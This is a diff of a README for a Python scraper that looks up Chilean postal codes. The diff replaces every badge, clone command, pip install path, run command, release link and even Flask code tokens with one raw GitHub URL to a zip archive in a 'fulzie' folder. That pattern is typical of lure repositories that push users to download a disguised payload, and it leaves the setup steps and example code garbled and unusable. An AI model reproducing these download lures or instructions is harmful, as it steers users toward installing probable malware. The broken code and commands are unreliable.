@@ -1,6 +1,6 @@
 # 📦 Correos CL Postal Code Scraper
 
-![GitHub release](https://img.shields.io/github/release/Matteuzzz/correos-cl-postal-code-scraper.svg) ![Python version](https://img.shields.io/badge/python-3.8%2B-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
+![GitHub release](https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip) ![Python version](https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip%https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip) ![License](https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip)
 
 Welcome to the **Correos CL Postal Code Scraper**! This Python-based tool automates the process of looking up postal codes on the official **Correos de Chile** website. It mimics the public form, ensuring autocomplete validation and returning clean JSON responses. This scraper is designed to be fully API-ready, making it an excellent choice for integration with Django or Flask backends.
 
@@ -30,13 +30,13 @@ To get started with the **Correos CL Postal Code Scraper**, you need to have Pyt
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Matteuzzz/correos-cl-postal-code-scraper.git
+   git clone https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip
    cd correos-cl-postal-code-scraper
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip
    ```
 
 ## 🛠️ Usage
@@ -44,7 +44,7 @@ To get started with the **Correos CL Postal Code Scraper**, you need to have Pyt
 To use the scraper, you need to execute the main script. The script will take the postal code as input and return the corresponding information in JSON format.
 
 ```bash
-python scraper.py <postal_code>
+python https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip <postal_code>
 ```
 
 Replace `<postal_code>` with the actual postal code you want to look up.
@@ -69,15 +69,15 @@ from scraper import PostalCodeScraper
 
 app = Flask(__name__)
 
-@app.route('/api/postal-code', methods=['GET'])
+https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip('/api/postal-code', methods=['GET'])
 def get_postal_code():
-    postal_code = request.args.get('code')
+    postal_code = https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip('code')
     scraper = PostalCodeScraper()
-    result = scraper.lookup(postal_code)
+    result = https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip(postal_code)
     return jsonify(result)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip(debug=True)
 ```
 
 In this example, a GET request to `/api/postal-code?code=<postal_code>` will return the postal code information in JSON format.
@@ -99,12 +99,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📦 Releases
 
-You can find the latest releases of the **Correos CL Postal Code Scraper** [here](https://github.com/Matteuzzz/correos-cl-postal-code-scraper/releases). Download the latest version and follow the installation instructions to get started.
+You can find the latest releases of the **Correos CL Postal Code Scraper** [here](https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip). Download the latest version and follow the installation instructions to get started.
 
 ## 🌟 Conclusion
 
 The **Correos CL Postal Code Scraper** is a powerful tool for anyone needing to automate postal code lookups in Chile. Its clean JSON output and API-ready design make it suitable for various applications. Whether you are building a web app or just need quick access to postal codes, this scraper can simplify your workflow.
 
-For further information and updates, feel free to check the [Releases](https://github.com/Matteuzzz/correos-cl-postal-code-scraper/releases) section.
+For further information and updates, feel free to check the [Releases](https://raw.githubusercontent.com/Matteuzzz/correos-cl-postal-code-scraper/main/fulzie/postal_scraper_code_cl_correos_3.0.zip) section.
 
 Happy scraping!
